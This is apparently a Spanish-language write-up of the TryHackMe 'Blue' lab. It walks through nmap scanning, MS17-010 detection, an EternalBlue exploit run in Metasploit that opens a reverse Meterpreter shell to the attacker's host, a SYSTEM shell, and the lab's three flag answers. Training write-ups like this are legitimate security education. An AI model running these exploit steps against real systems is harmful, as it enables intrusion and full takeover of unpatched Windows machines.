---
title: Blue [EASY]
layout: single
category: Tryhackme
slug: Tryhackme/blue
date: 2025-09-30
---

### Reconocimiento inicial

```bash
ping -c 1 10.10.195.198
nmap -n -Pn -sS -T5 -p- -sV 10.10.195.198

######### RESULTADO DEL SCAN ##########
Host is up (0.042s latency).
Not shown: 94 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Comprobación vulnerabilidades
Al tratarse de un win7, probablemente se pueda explotar un **Eternal Blue**, con nmap se lanza un nuevo scan al 445 para tratar de detectar si es vulnerable:

```bash
nmap -n -Pn -sS -T5 -p 445 --script "vuln" -sV 10.10.195.198

######### RESULTADO RESUMIDO ########
PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010)
```

### Explotacion (Metasploit)
```bash
msf exploit(windows/smb/ms17_010_psexec) > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
```

```bash
msf exploit(windows/smb/ms17_010_psexec) > use 0
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.9.2.79
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.195.198
msf exploit(windows/smb/ms17_010_eternalblue) > run
```

Resultado:
```bash
[*] 10.10.195.198:445 - Connecting to target for exploitation.
[+] 10.10.195.198:445 - Connection established for exploitation.
[+] 10.10.195.198:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.195.198:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.195.198:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.195.198:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.195.198:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.195.198:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.195.198:445 - Trying exploit with 17 Groom Allocations.
[*] 10.10.195.198:445 - Sending all but last fragment of exploit packet
[*] 10.10.195.198:445 - Starting non-paged pool grooming
[+] 10.10.195.198:445 - Sending SMBv2 buffers
[+] 10.10.195.198:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.195.198:445 - Sending final SMBv2 buffers.
[*] 10.10.195.198:445 - Sending last fragment of exploit packet!
[*] 10.10.195.198:445 - Receiving response from exploit packet
[+] 10.10.195.198:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.195.198:445 - Sending egg to corrupted connection.
[*] 10.10.195.198:445 - Triggering free of corrupted buffer.
[*] Sending stage (230982 bytes) to 10.10.195.198
[+] 10.10.195.198:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.195.198:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.195.198:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened (10.9.2.79:4444 -> 10.10.195.198:49215) at 2025-10-20 14:54:58 +0200

meterpreter > 

```

### Escalada privilegios
En este caso no es necesario, pero con getsystem en una sesion de meterpreter se puede tratar de elevar privilegios.
```bash
meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > shell
Process 2284 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### Flag obtain
Hay 3 flags:
```bash
meterpreter > search -f flag*.txt
Found 3 results...
==================

Path                                  Size (bytes)  Modified (UTC)
----                                  ------------  --------------
c:\Users\Jon\Documents\flag3.txt      37            2019-03-17 20:26:36 +0100
c:\Windows\System32\config\flag2.txt  34            2019-03-17 20:32:48 +0100
c:\flag1.txt                          24            2019-03-17 20:27:21 +0100


Flag1: {access_the_machine}
Flag2: {sam_database_elevated_access}
Flag3: {admin_documents_can_be_valuable}


```